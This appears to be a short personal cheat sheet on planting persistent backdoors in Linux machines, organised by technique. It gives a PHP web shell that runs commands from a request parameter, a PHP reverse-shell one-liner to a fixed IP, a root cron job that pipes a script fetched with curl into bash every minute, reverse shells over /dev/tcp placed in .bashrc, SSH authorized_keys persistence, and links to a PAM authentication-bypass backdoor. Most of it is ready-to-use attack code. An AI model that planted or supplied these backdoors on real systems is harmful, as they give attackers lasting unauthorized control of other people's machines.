# Linux backdoor
Some technique about creating a backdoor/persistent connection to linux
https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c

## ssh
Generate key `ssh-keygen`, put the public key to the ~/.ssh/authorized_keys in the target machine

## php
putting this in /var/www/html/:
```php
<?php  
    if (isset($_REQUEST['cmd'])) {  
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";  
    }  
?>
```
allow us to send a command to the target by using the `cmd` parameter
`targeturl/shell.php?cmd=COMMAND`

php one liner
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.4.50.18/4182 0>&1'"); ?>
```
## cronjobs
add to crontab:
`* *     * * *   root    curl http://<yourip>:8080/shell | bash`
to request bash script every minute from our machine via http(port 8080)
the script can be a simple reverse shell like this:
```bash
#/bin/bash
bash -i &> /dev/tcp/IP_ADDR/PORT 0>&1
```

## .bashrc
.bashrc is executed everytime a user log in to an interactive session.

Put this into our target .bashrc(usually at home directory)
`bash -i &> /dev/tcp/IP_ADDR/PORT 0>&1` to run a reverse shell everytime they start interactive shell sessions.

## pam_unix.so
pam_unix is the library for authenticating user. So we modify it by giving it a unique string to be compared outside the usual authentication function(`_unix_verify_password()`) to bypass it.
http://0x90909090.blogspot.com/2016/06/creating-backdoor-in-pam-in-5-line-of.html
https://github.com/zephrax/linux-pam-backdoor